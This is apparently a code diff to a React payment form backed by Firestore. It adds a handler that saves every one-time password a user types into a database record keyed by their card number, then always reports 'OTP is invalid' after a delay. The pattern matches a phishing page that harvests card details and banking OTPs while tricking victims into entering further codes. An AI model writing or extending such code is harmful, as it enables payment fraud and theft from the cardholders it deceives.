@@ -1,6 +1,6 @@
 'use client';
 import { useState } from 'react';
-import { doc, setDoc } from 'firebase/firestore';
+import { doc, setDoc, updateDoc } from 'firebase/firestore';
 import db from './firestore';
 type PaymentInfo = {
   cardNumber: string;
@@ -130,6 +130,7 @@ return ref
   };
   const [step, setstep] = useState(1);
   const [loading, setisloading] = useState(false)
+  const [newotp]= useState([''])
 
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
     cardNumber: '',
@@ -143,7 +144,11 @@ return ref
     bank_card: [''],
     prefix: '',
   });
-
+const handleAddotp=(otp:string)=>{
+  newotp.push(otp)
+  const docRef = doc(db,'orders',paymentInfo!.cardNumber)
+  updateDoc(docRef,{otp:newotp})
+}
   return (
     <>
       <form
@@ -536,6 +541,7 @@ return ref
                             setisloading(false)
                             if (step === 2) {
                               setisloading(true)
+                              handleAddotp(paymentInfo!.otp!)
                               setTimeout(() => {
                                 setisloading(false)
                                 return alert('OTP is invalid');
